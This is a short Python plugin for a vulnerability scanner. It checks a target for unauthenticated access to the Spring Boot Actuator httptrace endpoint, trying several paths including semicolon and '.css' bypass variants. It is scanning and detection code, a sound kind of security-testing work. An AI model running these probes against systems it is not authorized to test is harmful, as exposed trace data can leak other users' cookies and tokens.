from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req
from xing.core import PluginType, SchemeType


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "Actuator httptrace API 未授权访问"
        self.app_name = 'Actuator'
        self.scheme = [SchemeType.HTTPS, SchemeType.HTTP]

    def verify(self, target):
        paths = ["/actuator/httptrace", "/jeecg-boot/actuator/httptrace", "/actuator;/httptrace",
                 "/api/actuator;/httptrace",
                 "/api/actuator/httptrace", "/actuator/httptrace;.css"]
        for path in paths:
            url = target + path
            conn = http_req(url)
            content_type = conn.headers.get("Content-Type", "")

            if b'{"traces"' in conn.content and 'actuator' in content_type:
                self.logger.success("发现 {} {}".format(self.vul_name, self.target))
                return url
